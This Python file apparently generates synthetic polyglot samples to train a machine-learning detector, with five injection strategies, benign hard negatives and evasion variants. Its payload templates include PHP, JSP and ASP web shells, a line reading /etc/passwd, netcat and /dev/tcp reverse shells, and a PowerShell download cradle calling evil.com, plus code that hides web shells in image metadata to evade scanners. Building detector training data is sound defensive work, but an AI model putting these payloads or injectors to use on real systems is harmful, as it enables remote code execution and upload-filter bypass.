"""
Diverse Polyglot Generator — Eliminates Generator Fingerprints

Simulates 5 real-world polyglot tools/techniques:
  1. Corkami-style   — ZIP-in-PDF, multi-format overlap
  2. RedTeam Builder — append-after-end-marker (current method)
  3. Polyglot Poison — inject between header+trailer (web shell upload)
  4. Steganographic  — payload embedded at random mid-file offsets
  5. Overlap Craft   — format headers that parse as BOTH types

Each technique produces structurally different polyglots so the ML model
learns "what a polyglot looks like" not "what our builder looks like."

Author: Mr-DS-ML-85
"""

import os, struct, math, zlib, random
from pathlib import Path


# ═══════════════════════════════════════════════════════════════
# INJECTION STRATEGIES (simulate different real-world tools)
# ═══════════════════════════════════════════════════════════════

class InjectionStrategy:
    """Base class for polyglot construction techniques."""

    def inject(self, cover: bytes, payload: bytes, cover_fmt: str, exec_fmt: str) -> bytes:
        raise NotImplementedError


class AppendAfterEndMarker(InjectionStrategy):
    """Strategy 1: RedTeam Builder style — append after format end marker.
    Simulates: exe→jpg, bat→mp4, etc.
    The most common and simplest technique."""

    END_MARKERS = {
        "jpg": (b'\xff\xd9', 2), "png": (b'IEND', 8), "gif": (b'\x3b', 1),
        "pdf": (b'%%EOF', 5), "bmp": (b'', 0), "mp4": (b'moov', 4),
        "tiff": (b'', 0), "webm": (b'', 0),
    }

    def inject(self, cover, payload, cover_fmt, exec_fmt):
        marker_info = self.END_MARKERS.get(cover_fmt)
        if marker_info and marker_info[0]:
            marker, extra = marker_info
            pos = cover.rfind(marker)
            if pos != -1:
                # Add random padding between end marker and payload (realistic)
                padding = os.urandom(random.randint(0, 64))
                return cover[:pos + extra] + padding + payload
        return cover + payload


class CorkamiStyle(InjectionStrategy):
    """Strategy 2: Corkami polyglot research style.
    Multiple valid parse paths — the file is simultaneously valid as two formats.
    Key technique: ZIP local file header embedded inside PDF, RAR inside JPEG, etc.
    Uses structural overlaps rather than simple concatenation."""

    def inject(self, cover, payload, cover_fmt, exec_fmt):
        if cover_fmt == "pdf" and exec_fmt in ("zip", "jar", "apk"):
            # Corkami: ZIP entry embedded as PDF object stream
            zip_obj = b'\n1337 0 obj\n<< /Type /EmbeddedFile /Length %d >>\nstream\n' % len(payload)
            zip_obj += payload
            zip_obj += b'\nendstream\nendobj\n'
            eof_pos = cover.rfind(b'%%EOF')
            if eof_pos != -1:
                return cover[:eof_pos] + zip_obj + cover[eof_pos:]
            return cover + zip_obj

        if cover_fmt == "jpg" and exec_fmt in ("zip", "rar", "jar"):
            # Corkami: archive header placed after JPEG SOI, before image data
            # The archive parser sees PK/Rar! at offset 0 after skipping JPEG markers
            soi_end = cover.find(b'\xff\xda')  # Start of Scan
            if soi_end != -1:
                # Insert payload between header and scan data
                # Add padding to align payload at a parseable offset
                align = random.randint(0, 16)
                return cover[:soi_end] + b'\x00' * align + payload + cover[soi_end:]

        if cover_fmt == "gif" and exec_fmt in ("html", "js"):
            # Corkami: GIF extension block that HTML parser sees as script
            gce = b'\x21\xf9\x04' + os.urandom(4)  # Graphics Control Extension
            return cover[:-1] + gce + payload + b'\x3b'  # Before trailer

        # Fallback: append with format-specific alignment
        return cover + payload


class PolyglotPoison(InjectionStrategy):
    """Strategy 3: Polyglot Poison technique (web shell upload bypass).
    Payload injected BETWEEN header and trailer so both parsers succeed.
    - Image viewer reads header → trailer (shows image)
    - PHP/JSP parser reads from <?php tag (executes shell)

    Key difference from append: payload is INSIDE the cover's valid region,
    not after it. This makes trailing-data detectors fail."""

    def inject(self, cover, payload, cover_fmt, exec_fmt):
        if exec_fmt in ("php", "asp", "jsp"):
            if cover_fmt in ("jpg", "png", "gif", "bmp"):
                # Find a "quiet" region after header but before end marker
                header_end = min(512, len(cover) // 4)
                end_marker_pos = len(cover)

                # Find end marker
                for marker in [b'\xff\xd9', b'IEND', b'\x3b', b'%%EOF']:
                    pos = cover.rfind(marker)
                    if pos != -1:
                        end_marker_pos = pos
                        break

                # Inject web shell in the middle
                # Add EXIF-like padding to look natural
                exif_padding = b'\xff\xe1' + struct.pack('>H', len(payload) + 32) + os.urandom(28)
                inject_point = header_end + random.randint(0, 256)
                return cover[:inject_point] + exif_padding + payload + cover[inject_point:]

            if cover_fmt == "pdf":
                # Classic Polyglot Poison: PHP in PDF
                eof_pos = cover.rfind(b'%%EOF')
                if eof_pos != -1:
                    return cover[:eof_pos + 5] + b'\n' + payload + b'\n%%EOF\n'

        # Non-webshell: use Corkami-style for archives
        if cover_fmt in ("zip", "docx", "odt"):
            eocd = cover.rfind(b'\x50\x4b\x05\x06')
            if eocd != -1:
                return cover[:eocd] + payload + cover[eocd:]

        return cover + payload


class MidFileInjection(InjectionStrategy):
    """Strategy 4: Steganographic injection at random offsets.
    Simulates tools that embed payload at non-obvious positions:
    - Inside image pixel data (LSB stego)
    - In PDF stream objects
    - In ZIP extra fields
    - At random alignment offsets

    The payload is scattered/hidden rather than appended."""

    def inject(self, cover, payload, cover_fmt, exec_fmt):
        if len(cover) < 128:
            return cover + payload

        # Choose injection point: somewhere in the middle 60% of the file
        low = int(len(cover) * 0.2)
        high = int(len(cover) * 0.8)
        inject_at = random.randint(low, high)

        # For some formats, split the payload across multiple locations
        if random.random() < 0.3 and len(payload) > 256:
            # Split payload into chunks at different offsets
            chunk_size = len(payload) // 3
            chunks = [payload[:chunk_size], payload[chunk_size:2*chunk_size], payload[2*chunk_size:]]
            offsets = sorted(random.sample(range(low, high), 3))
            result = bytearray(cover)
            for chunk, offset in zip(chunks, offsets):
                # Overwrite existing bytes (more stealthy)
                end = min(offset + len(chunk), len(result))
                result[offset:end] = chunk[:end - offset]
            return bytes(result)
        else:
            # Single injection point
            noise = os.urandom(random.randint(0, 32))
            return cover[:inject_at] + noise + payload + cover[inject_at:]


class OverlapCraft(InjectionStrategy):
    """Strategy 5: Format overlap — file parses as BOTH formats simultaneously.
    The most advanced technique: headers are carefully crafted so that
    Format A's parser and Format B's parser both find valid structures.

    Examples:
    - MZ header that's also a valid JPEG comment
    - PNG chunk that contains a PE section header
    - PDF object that doubles as a ZIP local file entry

    This is what real APT groups use."""

    def inject(self, cover, payload, cover_fmt, exec_fmt):
        # Craft a dual-purpose header
        if exec_fmt in ("exe", "elf"):
            # Make the executable header look like it could be part of the cover
            if cover_fmt == "jpg":
                # JPEG COM (comment) marker: 0xFF 0xFE + length + data
                # The MZ header appears inside a JPEG comment
                comment_marker = b'\xff\xfe'
                length = struct.pack('>H', len(payload) + 2)
                # Start payload at an offset that makes MZ parseable
                return cover[:64] + comment_marker + length + payload + cover[64:]

            if cover_fmt == "png":
                # Create a custom PNG chunk containing the payload
                chunk_type = b'tEXt'  # Text chunk — parsers skip unknown content
                chunk_data = b'Comment\x00' + payload[:min(len(payload), 4096)]
                chunk_len = struct.pack('>I', len(chunk_data))
                crc = b'\x00\x00\x00\x00'  # Fake CRC
                # Insert before IEND
                iend_pos = cover.find(b'IEND')
                if iend_pos != -1:
                    return cover[:iend_pos - 4] + chunk_len + chunk_type + chunk_data + crc + cover[iend_pos - 4:]

            if cover_fmt == "pdf":
                # Embed as PDF stream object
                obj = b'\n9999 0 obj\n<< /Type /EmbeddedFile >>\nstream\n'
                obj += payload
                obj += b'\nendstream\nendobj\n'
                eof_pos = cover.rfind(b'%%EOF')
                if eof_pos != -1:
                    return cover[:eof_pos] + obj + cover[eof_pos:]

        if exec_fmt in ("php", "asp", "jsp", "sh", "bash", "py", "js"):
            # Script payload — inject as comment/metadata in the cover
            if cover_fmt in ("jpg", "png", "gif"):
                # Use XMP/EXIF metadata region
                xmp_header = b'<?xpacket begin="' + os.urandom(8) + b'" id="W5M0MpCehiHzreSzNTczkc9d"?>\n'
                xmp_footer = b'\n<?xpacket end="w"?>'
                inject_point = min(256, len(cover) // 8)
                return cover[:inject_point] + xmp_header + payload + xmp_footer + cover[inject_point:]

        # Default: Corkami-style
        return cover + payload


# ═══════════════════════════════════════════════════════════════
# STRATEGY REGISTRY
# ═══════════════════════════════════════════════════════════════

STRATEGIES = {
    "redteam_append":    AppendAfterEndMarker(),    # Simple append
    "corkami_overlap":   CorkamiStyle(),            # Multi-parse overlap
    "polyglot_poison":   PolyglotPoison(),           # Mid-file web shell
    "stego_inject":      MidFileInjection(),         # Random offset scatter
    "overlap_craft":     OverlapCraft(),             # Dual-purpose headers
}

# Strategy weights — simulates real-world distribution
# Most malware uses simple append; advanced APT uses overlap/craft
STRATEGY_WEIGHTS = {
    "redteam_append":    0.30,   # Most common (script kiddies, kits)
    "corkami_overlap":   0.20,   # Research/advanced
    "polyglot_poison":   0.20,   # Web shell attacks
    "stego_inject":      0.15,   # Steganography tools
    "overlap_craft":     0.15,   # APT/advanced
}


def get_random_strategy() -> InjectionStrategy:
    """Pick a random strategy weighted by real-world frequency."""
    names = list(STRATEGY_WEIGHTS.keys())
    weights = [STRATEGY_WEIGHTS[n] for n in names]
    chosen = random.choices(names, weights=weights, k=1)[0]
    return STRATEGIES[chosen], chosen


# ═══════════════════════════════════════════════════════════════
# COVER FILE GENERATION (variable sizes, realistic content)
# ═══════════════════════════════════════════════════════════════

HEADERS = {
    "jpg":  b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00',
    "png":  b'\x89PNG\r\n\x1a\n',
    "gif":  b'GIF89a\x01\x00\x01\x00\x80\x00\x00',
    "bmp":  b'BM',
    "pdf":  b'%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n',
    "zip":  b'PK\x03\x04\x14\x00\x00\x00\x00\x00',
    "rar":  b'Rar!\x1a\x07\x00',
    "7z":   b'7z\xbc\xaf\x27\x1c',
    "mp4":  b'\x00\x00\x00\x1cftypisom\x00\x00\x02\x00isomiso2',
    "mp3":  b'\xff\xfb\x90\x00',
    "wav":  b'RIFF\x00\x00\x00\x00WAVEfmt \x10\x00\x00\x00',
    "webm": b'\x1a\x45\xdf\xa3',
    "tiff": b'II\x2a\x00',
    "html": b'<!DOCTYPE html><html><head></head><body>',
    "doc":  b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1',
    "docx": b'PK\x03\x04\x14\x00\x06\x00',
    "odt":  b'PK\x03\x04\x14\x00\x00\x08',
}

EXEC_HEADERS = {
    "exe":  b'MZ',
    "elf":  b'\x7fELF',
    "php":  b'<?php',
    "asp":  b'<%@',
    "jsp":  b'<%',
    "bat":  b'@echo off\r\n',
    "vbs":  b"' Script\r\nCreateObject(",
    "ps1":  b'powershell -nop -w hidden -ep bypass',
    "sh":   b'#!/bin/sh\n',
    "bash": b'#!/bin/bash\n',
    "py":   b'#!/usr/bin/env python3\n',
    "scpt": b'#!/usr/bin/osascript\n',
    "js":   b'function(){var ',
    "apk":  b'PK\x03\x04\x14\x00\x00\x08',
    "jar":  b'PK\x03\x04\x14\x00\x08\x00',
}


def make_diverse_cover(fmt: str) -> bytes:
    """Generate a cover file with VARIABLE size (not fixed).
    Real files come in all sizes — fixed-size covers are a fingerprint."""
    header = HEADERS.get(fmt, b'\x00' * 16)

    # Variable sizes: log-normal distribution simulates real file sizes
    # Small: 200-2KB, Medium: 2KB-50KB, Large: 50KB-500KB
    size_class = random.choices(["small", "medium", "large"], weights=[0.3, 0.5, 0.2])[0]
    if size_class == "small":
        size = random.randint(200, 2000)
    elif size_class == "medium":
        size = random.randint(2000, 50000)
    else:
        size = random.randint(50000, 500000)

    # Generate body with VARIABLE entropy (not just random bytes)
    entropy_mode = random.choice(["random", "low", "text", "structured", "mixed"])
    if entropy_mode == "random":
        body = os.urandom(size)
    elif entropy_mode == "low":
        body = bytes([random.randint(0, 16)] * size)
    elif entropy_mode == "text":
        lorem = b'Lorem ipsum dolor sit amet, consectetur adipiscing elit. ' * (size // 56 + 1)
        body = lorem[:size]
    elif entropy_mode == "structured":
        chunk_size = random.choice([16, 32, 64, 128])
        pattern = os.urandom(chunk_size)
        body = (pattern * (size // chunk_size + 1))[:size]
    else:  # mixed
        half = size // 2
        body = os.urandom(half) + b'\x00' * (size - half)

    # Format-specific tail
    end = b''
    if fmt == "jpg":
        end = b'\xff\xd9'
    elif fmt == "png":
        end = b'\x00\x00\x00\x00IEND\xaeB`\x82'
    elif fmt == "gif":
        end = b'\x3b'
    elif fmt == "pdf":
        end = b'xref\n0 1\ntrailer<</Root 1 0 R>>\nstartxref\n0\n%%EOF\n'
    elif fmt == "bmp":
        header = b'BM' + struct.pack('<I', 54 + size) + b'\x00' * 4 + struct.pack('<I', 54)
    elif fmt == "mp4":
        body = b'\x00' * 8 + b'moov' + os.urandom(size)
    elif fmt in ("doc", "docx", "odt", "rar", "7z", "mp3", "wav", "webm", "tiff"):
        body = os.urandom(size)

    return header + body + end


def make_diverse_payload(exec_fmt: str) -> bytes:
    """Generate payload with diverse entropy/content profiles.
    Real payloads aren't all random bytes — they have structure."""
    size = random.randint(200, 10000)
    header = EXEC_HEADERS.get(exec_fmt, b'\x00' * 4)

    # Payload content varies: some are high-entropy (packed), some are low (scripts)
    if exec_fmt in ("php", "asp", "jsp", "sh", "bash", "py", "vbs", "ps1", "scpt", "js"):
        # Script payloads: low entropy, many printable chars
        code_body = _make_script_payload(exec_fmt, size)
        return header + code_body
    elif exec_fmt in ("exe", "elf"):
        # Binary payloads: variable entropy
        return header + _make_binary_payload(size)
    else:
        return header + os.urandom(size)


def _make_script_payload(fmt: str, size: int) -> bytes:
    """Generate realistic script content with varying obfuscation."""
    templates = {
        "php": [
            b'if(isset($_REQUEST["cmd"])){system($_REQUEST["cmd"]);}',
            b'$f=file_get_contents("/etc/passwd");echo $f;',
            b'eval(base64_decode("' + os.urandom(32) + b'"));',
            b'exec($_POST["cmd"]);',
        ],
        "asp": [
            b'eval request("cmd")',
            b'Set fso=CreateObject("Scripting.FileSystemObject")',
        ],
        "jsp": [
            b'Runtime.getRuntime().exec(request.getParameter("cmd"));',
            b'Process p=Runtime.getRuntime().exec("cmd.exe /c "+request.getParameter("x"));',
        ],
        "sh": [b'rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '],
        "bash": [b'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'],
        "py": [b'import socket,subprocess;s=socket.socket()'],
        "vbs": [b'Set objShell=CreateObject("WScript.Shell")\nobjShell.Run "cmd /c calc"'],
        "ps1": [b'IEX(New-Object Net.WebClient).DownloadString("http://evil.com/payload")'],
        "js": [b'require("child_process").exec("calc.exe")'],
        "scpt": [b'tell application "Finder"\ndo shell script "id"\nend tell'],
    }

    base = random.choice(templates.get(fmt, [b'# payload']))
    # Pad to variable size with comments or whitespace
    padding_types = [b'\n# ' + os.urandom(16), b'\n', b' ' * 16, b'\n// ' + os.urandom(8)]
    result = base
    while len(result) < size:
        result += random.choice(padding_types)
    return result[:size]


def _make_binary_payload(size: int) -> bytes:
    """Generate binary payload with diverse entropy profiles."""
    mode = random.choice(["packed", "code", "mixed", "encrypted"])
    if mode == "packed":
        # High entropy (UPX-like)
        return os.urandom(size)
    elif mode == "code":
        # Medium entropy (realistic code sections)
        # Lots of 0x00 padding between code blocks
        chunks = []
        for _ in range(size // 128):
            if random.random() < 0.6:
                chunks.append(os.urandom(random.randint(4, 32)))
            else:
                chunks.append(b'\x00' * random.randint(32, 96))
        result = b''.join(chunks)
        return result[:size] if len(result) >= size else result + os.urandom(size - len(result))
    elif mode == "mixed":
        # First half random, second half zeros (common in real PE)
        half = size // 2
        return os.urandom(half) + b'\x00' * (size - half)
    else:
        # XOR-encrypted with random key
        key = random.randint(1, 255)
        return bytes((b ^ key) for b in os.urandom(size))


# ═══════════════════════════════════════════════════════════════
# ADVERSARIAL SAMPLES (hard negatives that look polyglot but aren't)
# ═══════════════════════════════════════════════════════════════

def make_adversarial_benign(fmt: str) -> bytes:
    """Generate benign files that MIGHT trigger false positives.
    These are clean files with characteristics that resemble polyglots:
    - High entropy (encrypted ZIP, compressed images)
    - Multiple magic bytes (self-extracting archives)
    - Long trailing data (metadata, padding)
    - Script-like strings in binary files
    """
    cover = make_diverse_cover(fmt)
    variant = random.choice(["high_entropy", "metadata_heavy", "dual_header_benign", "trailing_padding"])

    if variant == "high_entropy":
        # Compressed/encrypted content (high entropy but NOT polyglot)
        return cover + os.urandom(random.randint(100, 2000))

    elif variant == "metadata_heavy":
        # Lots of metadata (EXIF, XMP, IPTC) — looks suspicious but is benign
        meta = b'<?xpacket begin="\xef\xbb\xbf" id="W5M0MpCehiHzreSzNTczkc9d"?>\n'
        meta += b'<x:xmpmeta xmlns:x="adobe:ns:meta/">\n'
        meta += b'<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">\n'
        meta += os.urandom(random.randint(200, 1000))
        meta += b'\n</rdf:RDF></x:xmpmeta>\n<?xpacket end="w"?>'
        insert_at = min(512, len(cover) // 4)
        return cover[:insert_at] + meta + cover[insert_at:]

    elif variant == "dual_header_benign":
        # File that has magic bytes of another format in its data (e.g., "MZ" in text)
        # This is NOT a polyglot — the MZ is just coincidental text
        text = b'The MZ header format is used by PE executables. PK is for ZIP. %%PDF is for documents.\n'
        text += b'\x7fELF files are Linux executables. GIF89a is an image format.\n'
        text += os.urandom(random.randint(100, 500))
        insert_at = random.randint(64, len(cover) // 2)
        return cover[:insert_at] + text + cover[insert_at:]

    else:
        # Trailing null bytes / padding (common in real files from disk imaging)
        padding = b'\x00' * random.randint(512, 4096)
        return cover + padding


# ═══════════════════════════════════════════════════════════════
# ADVERSARIAL POLYGLOTS (deliberately try to evade detection)
# ═══════════════════════════════════════════════════════════════

def make_evasion_polyglot(cover_fmt: str, exec_fmt: str) -> bytes:
    """Generate polyglots that deliberately try to evade scanners.
    Teaches the model to detect HARD polyglots, not just easy ones."""
    cover = make_diverse_cover(cover_fmt)
    payload = make_diverse_payload(exec_fmt)

    evasion = random.choice(["obfuscated_header", "minimal_footprint", "reversed_order", "fragmented"])

    if evasion == "obfuscated_header":
        # XOR the payload header so magic-byte scanners miss it
        key = random.randint(1, 255)
        obfuscated = bytes((b ^ key) for b in payload[:4]) + payload[4:]
        # Add decoder stub
        stub = bytes([key])
        payload = stub + obfuscated

    elif evasion == "minimal_footprint":
        # Tiny payload — just enough to be exploitable
        payload = payload[:random.randint(32, 256)]

    elif evasion == "reversed_order":
        # Payload BEFORE cover (some parsers read from the end)
        return payload + cover

    elif evasion == "fragmented":
        # Split payload across multiple locations
        chunk_size = max(16, len(payload) // random.randint(3, 8))
        result = bytearray(cover)
        for i in range(0, len(payload), chunk_size):
            offset = random.randint(0, max(1, len(result) - chunk_size))
            chunk = payload[i:i + chunk_size]
            end = min(offset + len(chunk), len(result))
            result[offset:end] = chunk[:end - offset]
        return bytes(result)

    # Default: use a random strategy
    strategy, _ = get_random_strategy()
    return strategy.inject(cover, payload, cover_fmt, exec_fmt)
